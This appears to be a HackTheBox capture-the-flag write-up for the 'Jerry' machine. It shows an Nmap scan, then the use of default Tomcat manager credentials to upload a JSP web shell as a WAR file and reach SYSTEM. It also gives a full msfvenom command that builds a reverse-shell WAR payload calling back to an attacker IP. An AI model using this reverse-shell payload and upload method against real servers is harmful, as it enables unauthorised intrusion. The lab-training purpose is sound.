excerpt: "Jerry is an easy box from HackTheBox. This machine explores the upload vulnerability in the manager section. Which the attacker can upload the WAR file payload and get the reverse shell as a system user. The credentials are really easy to own because it's using the default creds, also, the error page exposes it as well."

As always, I'm gonna start with the Nmap scan with this IP address `10.10.10.95`

```sql
# Nmap 7.92 scan initiated Tue Mar  1 07:29:58 2022 as: nmap -sC -sV -p- -oN nmap/jerry_all 10.10.10.95

One port just opens at `8080` and it is `Apache Tomcat`. Well, this machine is straightforward. So, I'm gonna show, you how to exploit it with `msfvenom` and `web shell`. Let's go.

# <font color="#9bffc8">Http (Apache Tomcat)</font>
Let's take a look at port `8080` which serve as Http.

It's just an `Apache Tomcat` default page after installations. So, I'll try to play around. Then, I found the `/manager/html` section upon clicking the  `Manager App` button. Also, I found the credentials on the `error` page.

# <font color="#9bffc8">/manager/html</font>
On this page, we can upload the `WAR` file to the server. Then, I'm thinking maybe I can upload some sort of shell since this is an old version of `Apache Tomcat`.

# <font color="#9bffc8">WebShell</font>
With light googling, I found this [webshell](https://raw.githubusercontent.com/BustedSec/webshell/master/index.jsp). So, I'm gonna create a new directory called `xploit`. Then, download it with the `wget` command in `xploit` dir. However, we wanted in form of a `WAR` file to be able to upload it. Let's convert this `.jsp` file into `.WAR` file.

If the command successfully ran. There will be a new file created in your current directory. In this case, my `xploit` directory. Now, Let's upload the newly created web shell to the server. It went through and didn't throw any errors.

To spawn the shell, just click the `/web shell` path in the table.

WOW! we just became `nt authority\system` user. Furthermore, you can upload the [nishang](https://github.com/samratashok/nishang)  reverse shell to get a proper shell.

# <font color="#9bffc8">MSFVenom</font>
If you like to get a reverse shell straight away. We can use the `msfvenom` payload and get the connection back through `nc`. First, let's create the `payload` with this command; and make sure to start the listener as well.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=your_ip LPORT=any_port -f war -o shell.war
```

The last step is, to upload it into this machine and double-click the `/shell`. _ET VOILA_
